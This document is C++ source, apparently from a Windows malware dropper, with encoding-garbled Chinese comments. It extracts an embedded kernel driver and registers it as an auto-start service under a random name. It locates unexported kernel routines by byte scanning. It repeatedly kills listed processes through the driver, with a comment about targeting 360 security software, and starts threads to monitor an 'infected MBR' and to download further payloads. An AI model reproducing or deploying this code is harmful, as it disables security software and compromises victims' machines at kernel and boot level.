////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include "Common.h"




//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//
extern	HMODULE			g_hSelfModule;
extern	OSVERSIONINFOEX	g_OSVerInfo;
//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//
DWORD	GetRandomVal();
DWORD	WINAPI MonMBR(LPVOID lpParameter);
DWORD	WINAPI DownLoad(LPVOID lpParameter);
//--------------------------------------------------------------------------//

char		g_szSystemPath[MAX_PATH], g_szTempPath[MAX_PATH];	//�ɼ��ٳ������
HANDLE		g_hDriver = INVALID_HANDLE_VALUE;

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//�����ļ�
BOOL BuildFile(char *szFilePath, char *pFileByte, DWORD dwFileSize)
{
	BOOL	bStatus = FALSE;
	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	dwByte = 0;


	hFile = CreateFile(szFilePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		goto __END;
	}

	bStatus = WriteFile(hFile, pFileByte, dwFileSize, &dwByte, NULL);
	CloseHandle( hFile );

__END:
	return bStatus;
}

//�ͷ���Դ���ļ�
BOOL Reresource(char *szFilePath, HMODULE hModule, int iReID)
{
	BOOL	bStatus = TRUE;
	HRSRC	hResource = NULL;
	HGLOBAL pLoad = NULL;
	DWORD	dwSize = 0;


	hResource = FindResource(hModule, MAKEINTRESOURCE( iReID ), "FILE");
	dwSize = SizeofResource(hModule, hResource);
	pLoad = LoadResource(hModule, hResource);
	LockResource( pLoad );

	bStatus = BuildFile(szFilePath, (char*)pLoad, dwSize);

	FreeResource( pLoad );

	return bStatus;
}

//��ȡ�ں�ģ��Ļ�ַ��ģ������
PVOID GetModuleBase(__out char *szModuleName, __in DWORD dwFlag)
{
typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct {
	DWORD    dwNumberOfModules;
	SYSTEM_MODULE_INFORMATION    smi;
} MODULES, *PMODULES;

typedef	NTSTATUS (NTAPI *DEF_ZwQuerySystemInformation)(
    ULONG	SystemInformationClass,
    PVOID	SystemInformation,
    ULONG	SystemInformationLength,
    PULONG	ReturnLength
);

	PVOID	pModuleBase = NULL;
	DWORD	dwSize = 0; 
	MODULES	*pModule = NULL;

	DEF_ZwQuerySystemInformation	PROZwQuerySystemInformation = NULL;

	
	PROZwQuerySystemInformation = (DEF_ZwQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll"), "ZwQuerySystemInformation");
	PROZwQuerySystemInformation(11, &pModule, sizeof(DWORD), &dwSize);	//#define STATUS_INFO_LENGTH_MISMATCH		((NTSTATUS)0xC0000004L)
	if(dwSize != 0)
	{
		pModule = (MODULES*)new char[dwSize];
		if(pModule == NULL)
		{
			return	NULL;
		}
	}
	else
	{
		return	NULL;
	}
	PROZwQuerySystemInformation(11, pModule, dwSize, NULL);
	
	if(dwFlag == 1)
	{
		SYSTEM_MODULE_INFORMATION		*pMove = NULL;

		pMove = &pModule->smi;
		for(DWORD i = 0; i < pModule->dwNumberOfModules; i++)
		{
			if( lstrcmpi(szModuleName, (pMove->ImageName + pMove->ModuleNameOffset) ) == 0 )
			{
				pModuleBase = pMove->Base;
				break;
			}

			pMove ++;
		}
	}
	else if(dwFlag == 0)
	{
		//ϵͳ�ں�ģ�� �����ڵ� 1 ��
		pModuleBase = pModule->smi.Base;
		lstrcpy(szModuleName, (pModule->smi.ImageName + pModule->smi.ModuleNameOffset) );
	}

	delete pModule;

	return	pModuleBase;
}

//��ʼ������
void InitialDriver()
{
	typedef	struct	__INITIALDRIVER{
	DWORD	dwAddr_MmGetSystemRoutineAddress;
	DWORD	dwAddr_PspTerminateThreadByPointer;
	DWORD	dwAddr_KeInsertQueueApc;
	DWORD	dwAddr_KiInsertQueueApc;

	char	cPspTerminateThreadByPointerHead[12];
	char	cKeInsertQueueApcHead[12];
	char	cKiInsertQueueApcHead[12];

	DWORD	dwThreadListHeadOffset;
	DWORD	dwThreadListEntryOffset;
	}INITIALDRIVER, *PINITIALDRIVER;

	INITIALDRIVER	InitialDriver;
	char			szKernelName[MAX_PATH], *pMove = NULL;
	DWORD			dwModuleBase = 0, dwOffset = 0, dwByte = 0;
	HMODULE			hKernel = NULL;


	memset(&InitialDriver, 0, sizeof(InitialDriver));

	//��ȡһЩ�ں˺�����ʵ�ʵ�ַ
	dwModuleBase = (DWORD)GetModuleBase( szKernelName, 0 );
	hKernel = LoadLibrary( szKernelName );
	dwOffset = dwModuleBase - (DWORD)hKernel;

	InitialDriver.dwAddr_MmGetSystemRoutineAddress = (DWORD)GetProcAddress(hKernel, "MmGetSystemRoutineAddress");
	InitialDriver.dwAddr_KeInsertQueueApc = (DWORD)GetProcAddress(hKernel, "KeInsertQueueApc");
	//�ҵ�PspTerminateThreadByPointer�ĵ�ַ
	pMove = (char*)GetProcAddress(hKernel, "PsTerminateSystemThread");
	for(DWORD i = 0; i < 256; i++)
	{
		if(*pMove == '\xff' && *(DWORD*)(pMove + 1) == 0xe8500875)
		{
			InitialDriver.dwAddr_PspTerminateThreadByPointer = (DWORD)(*(DWORD*)(pMove + 5) + (pMove + 9));
			break;
		}

		pMove ++;
	}

	//�ҵ� KiInsertQueueApc �ĵ�ַ
	pMove = (char*)InitialDriver.dwAddr_KeInsertQueueApc;
	for(DWORD i = 0; i < 256; i++)
	{
		if(*pMove == '\xe8' && (*(DWORD*)(pMove - 3) & 0xFFFFF0FF) == 0xe8284089)
		{
			InitialDriver.dwAddr_KiInsertQueueApc = ((DWORD)pMove + 5) + *(DWORD*)(pMove + 1);
			break;
		}

		pMove ++;
	}

	//��ȡ����ͷ�����ֽ�
	memcpy(InitialDriver.cPspTerminateThreadByPointerHead, (char*)InitialDriver.dwAddr_PspTerminateThreadByPointer, sizeof(InitialDriver.cPspTerminateThreadByPointerHead));
	memcpy(InitialDriver.cKeInsertQueueApcHead, (char*)InitialDriver.dwAddr_KeInsertQueueApc, sizeof(InitialDriver.cKeInsertQueueApcHead));
	memcpy(InitialDriver.cKiInsertQueueApcHead, (char*)InitialDriver.dwAddr_KiInsertQueueApc, sizeof(InitialDriver.cKiInsertQueueApcHead));

	//������ַ
	InitialDriver.dwAddr_MmGetSystemRoutineAddress += dwOffset;
	InitialDriver.dwAddr_PspTerminateThreadByPointer += dwOffset;
	InitialDriver.dwAddr_KeInsertQueueApc += dwOffset;
	InitialDriver.dwAddr_KiInsertQueueApc += dwOffset;

	FreeLibrary( hKernel );

	//������Ϣѡ��
	if( g_OSVerInfo.dwMajorVersion == 5 )
	{
		switch( g_OSVerInfo.dwMinorVersion )
		{
			case 1:
				{
					InitialDriver.dwThreadListHeadOffset	= 0x190;
					InitialDriver.dwThreadListEntryOffset	= 0x22c;
				}
				break;
			case 2:
				{
					InitialDriver.dwThreadListHeadOffset	= 0x180;
					InitialDriver.dwThreadListEntryOffset	= 0x224;
				}
				break;
			default:
				break;
		}
	}
	else//NT6
	{
		if(g_OSVerInfo.dwMinorVersion == 0)	//Vista
		{
			InitialDriver.dwThreadListHeadOffset	= 0x168;
			InitialDriver.dwThreadListEntryOffset	= 0x248;
		}
		else //win7������ϵͳ
		{
			InitialDriver.dwThreadListHeadOffset	= 0x188;
			InitialDriver.dwThreadListEntryOffset	= 0x268;
		}
	}

	//��õ���Ϣ���ݸ�����
	DeviceIoControl(g_hDriver, IOCTL_INITIAL, &InitialDriver, sizeof(InitialDriver), NULL, 0, &dwByte, NULL);

	return;
}

//��������Ƿ��Ѽ���,������ȫ�ֱ��� g_hDriver
BOOL CheckDriver(DWORD dwTime)
{
	for(DWORD i = 0; i < dwTime; i++)	//ע��, ���ʱ��ǳ���
	{
		HANDLE	hMyDriver = INVALID_HANDLE_VALUE;

		hMyDriver = CreateFile(DEVICESYMBOLLINK, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if(hMyDriver != INVALID_HANDLE_VALUE)
		{
			g_hDriver = hMyDriver;
			return TRUE;
		}
		Sleep( 50 );
	}

	return FALSE;
}

//�������� 2
BOOL LdrWithNormal()
{
	char		szSYSPath[MAX_PATH], szSvcName[64];
	DWORD		dwRandVal = 0;
	SC_HANDLE	hSCM = NULL, hService = NULL;


	dwRandVal = GetRandomVal();

	wsprintf(szSvcName, "%.8X", dwRandVal);
	wsprintf(szSYSPath, "%s\\%s.sys", g_szSystemPath, szSvcName);

	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	hService = CreateService(hSCM, szSvcName, szSvcName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, szSYSPath, "Base", NULL, NULL, NULL, NULL);
	
	Reresource(szSYSPath, g_hSelfModule, FILE_SYS);

	StartService(hService, 0, NULL);
	CloseServiceHandle( hService );
	CloseServiceHandle( hSCM );

	return CheckDriver( 20 );
}

//ö�ٽ���, ����һЩ����
DWORD ProcessEnumAndOperate(char *pInBuffer, DWORD dwBufferSize, DWORD dwFlag)
{
	UNUSEPARAM		dwBufferSize;
	DWORD			dwResult = 0;
	HANDLE			hProcessSnap = INVALID_HANDLE_VALUE;
	PROCESSENTRY32	pe32;


	memset(&pe32, 0, sizeof(pe32));
	pe32.dwSize = sizeof(pe32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	Process32First(hProcessSnap, &pe32);

	do
	{
		if(dwFlag == 2)
		{
			char	*pTemp = pInBuffer;
			DWORD	dwByte = 0;

			while(*pTemp)
			{
				if(lstrcmpi(pe32.szExeFile, pTemp) == 0)
				{
					DeviceIoControl(g_hDriver, IOCTL_KILLPROCESS, &pe32.th32ProcessID, sizeof(pe32.th32ProcessID), NULL, 0, &dwByte, NULL);
				}

				pTemp = pTemp + lstrlen( pTemp ) + 1;
			}
		}
		else if(dwFlag == 4)
		{
			if(lstrcmpi(pe32.szExeFile, pInBuffer) == 0)
			{
				dwResult = pe32.th32ProcessID;
				break;
			}
		}

	}while( Process32Next(hProcessSnap, &pe32) );
	CloseHandle( hProcessSnap );

	return dwResult;
}

//ɱ����
DWORD WINAPI KillProcess(LPVOID lpParameter)
{
	UNUSEPARAM	lpParameter;


	if(g_hDriver == INVALID_HANDLE_VALUE)
	{
		//����û����, �޷�����ɱ����;
		goto __END;
	}

	//ѭ����ؽ��̵ĳ���
	for(;;)
	{
		//��ؽ�������
		ProcessEnumAndOperate(g_pGlobalParameter->cKillProcess, sizeof(g_pGlobalParameter->cKillProcess), 2);

		//ͨ���ԱȽ��̵�������˾?Ϊ��360��ĳ������?
		//....

		Sleep( 1000*2 );//���2��
	}

__END:
	return 0;
}

//�������������߳�
DWORD WINAPI WorkThread(LPVOID lpParameter)
{
	UNUSEPARAM	lpParameter;

//	MessageBox( NULL, "00", "a", 0 );

	//һЩ׼������
	GetSystemDirectory(g_szSystemPath, MAX_PATH);
	GetTempPath(MAX_PATH, g_szTempPath);

	char	szMsg[100];

	//����������û��?
__OPENDEV:
	g_hDriver = CreateFile(DEVICESYMBOLLINK, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if( g_hDriver == INVALID_HANDLE_VALUE )
	{
		//���ϵͳ����������1����
		if(GetTickCount() < 60000)
		{
			Sleep( 100 );
			goto __OPENDEV;
		}
		//��Ҫ���¼������� <ע��, ��ʱ����Ҫ������\����������ǽ��, ��Ϊ����, Ҫô���������Ѽ���, Ҫô���Ǳ�ģ���������ȫ���ߵĽ��̸��������>
		////if(LdrWithswenum() == FALSE)//����Ҫ�����ʽ
		////{
			LdrWithNormal();
		////}
	}
	if( g_hDriver != INVALID_HANDLE_VALUE )
	{
		//��ʼ������
		InitialDriver();

		//ɱ����
		CreateThread(NULL, 0, KillProcess, NULL, 0, NULL);

		//���/�޸� '��ȾMBR'
		CreateThread(NULL, 0, MonMBR, NULL, 0, NULL);

		wsprintf(szMsg, "CreateThread(NULL, 0, MonMBR, NULL, 0, NULL)..." );
		WriteLog(szMsg, 0);

	}
//	MessageBox( NULL, "00", "b", 0 );

	wsprintf(szMsg, "׼���� �����߳�..." );
	WriteLog(szMsg, 0);


	//����
	Sleep(1000 * 5);	//5���ʼ���������߳�
//	MessageBox( NULL, "1122", "b", 0 );
	CreateThread(NULL, 0, DownLoad, NULL, 0, NULL);


	return 0;
}